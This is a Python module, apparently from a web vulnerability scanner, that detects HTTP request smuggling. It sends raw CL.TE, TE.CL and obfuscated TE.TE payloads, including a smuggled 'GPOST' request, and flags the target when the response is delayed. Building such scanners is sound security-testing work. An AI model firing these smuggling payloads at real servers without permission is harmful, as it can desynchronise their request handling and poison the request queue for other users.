import socket
import ssl
import time
from urllib.parse import urlparse

def create_socket(target_url):
    """
    Crée une connexion brute (Socket) vers la cible.
    Gère le HTTP et le HTTPS (via SSL wrap).
    """
    parsed = urlparse(target_url)
    host = parsed.netloc.split(':')[0]
    
    # Détermination du port
    if ":" in parsed.netloc:
        port = int(parsed.netloc.split(':')[1])
    else:
        port = 443 if parsed.scheme == "https" else 80

    try:
        # 1. Connexion TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15) # Timeout large pour l'attente
        sock.connect((host, port))
        
        # 2. Upgrade SSL si nécessaire
        if parsed.scheme == "https":
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
            
        return sock, host, port
    except Exception:
        return None, None, None

def send_raw_payload(sock, payload):
    """Envoie les octets bruts et tente de lire la réponse."""
    try:
        sock.sendall(payload)
        # On essaie de lire un premier octet pour déclencher le timer du serveur
        # Si le serveur attend la suite (Smuggling), cette lecture va bloquer/timeout
        sock.settimeout(5) 
        return sock.recv(4096)
    except socket.timeout:
        return "TIMEOUT"
    except Exception:
        return None

def run_smuggling_test(engine, point, param, level, bypass, waf_name=None):
    """
    Teste les vulnérabilités de HTTP Request Smuggling (CL.TE et TE.CL).
    Utilise une détection temporelle (Time-Based).
    """
    target_url = point['url']
    path = urlparse(target_url).path or "/"
    
    if engine.config['verbose']:
        print(f"[INFO] Test Smuggling (Raw Socket) sur {target_url}")

    # Le Smuggling est une attaque d'infrastructure, pas de paramètre.
    # On ne le lance qu'une fois par URL, pas pour chaque paramètre.
    if param != "Headers": 
        return

    # TEST 1 : CL.TE (Front-End: Content-Length / Back-End: Transfer-Encoding)
    # Scénario : Le Front voit CL=6 (Corps: 0\r\n\r\nX).
    # Le Back voit TE. Il lit le chunk '0' (fin). Mais 'X' n'est pas traité.
    # Le Back attend la suite de la requête qui commencerait par 'X'... TIMEOUT.
    
    sock, host, port = create_socket(target_url)
    if sock:
        payload_cl_te = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: keep-alive\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"
        ).encode() # Pas de \r\n final après X pour forcer l'attente

        start = time.time()
        resp = send_raw_payload(sock, payload_cl_te)
        duration = time.time() - start
        sock.close()

        if resp == "TIMEOUT" or duration > 4.5:
            engine.add_vulnerability(
                "HTTP Smuggling (CL.TE)", 
                target_url, 
                "Raw Payload (CL=6, TE=chunked)", 
                "Le serveur a timeout en attendant la fin du chunk (Désynchronisation détectée).", 
                parameter="Headers"
            )
            return # On a trouvé, on arrête

    # TEST 2 : TE.CL (Front-End: Transfer-Encoding / Back-End: Content-Length)
    # Scénario : Le Front voit TE. Chunk '4' (1234) puis '0'. Tout est bon.
    # Le Back voit CL=4. Il lit "5c\r\n" et s'arrête.
    # Le reste est interprété comme le début de la requête suivante.
    # Comme ce n'est pas une requête complète, le Back attend la suite -> TIMEOUT.

    sock, host, port = create_socket(target_url)
    if sock:
        payload_te_cl = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5c\r\n"       
            "GPOST / HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        start = time.time()
        resp = send_raw_payload(sock, payload_te_cl)
        duration = time.time() - start
        sock.close()

        if resp == "TIMEOUT" or duration > 4.5:
            engine.add_vulnerability(
                "HTTP Smuggling (TE.CL)", 
                target_url, 
                "Raw Payload (CL=4, TE=chunked)", 
                "Le serveur a timeout (Queue Poisoning potentiel).", 
                parameter="Headers"
            )

    # TEST 3 : TE.TE (Obfuscation du Header TE)
    # On essaie de masquer le header TE pour voir si l'un des serveurs l'ignore.
    # Variations : "Transfer-Encoding: xchunked", "Transfer-Encoding : chunked"
    
    obfuscations = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        " Transfer-Encoding: chunked"
    ]

    for te_header in obfuscations:
        sock, host, port = create_socket(target_url)
        if not sock: continue
        
        payload_te_te = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            f"{te_header}\r\n"
            "\r\n"
            "5c\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        start = time.time()
        resp = send_raw_payload(sock, payload_te_te)
        duration = time.time() - start
        sock.close()

        if resp == "TIMEOUT" or duration > 4.5:
            engine.add_vulnerability(
                "HTTP Smuggling (TE.TE Obfuscation)", 
                target_url, 
                f"Header Obfusqué: {te_header}", 
                "Désynchronisation via header TE malformé.", 
                parameter="Headers"
            )
            break
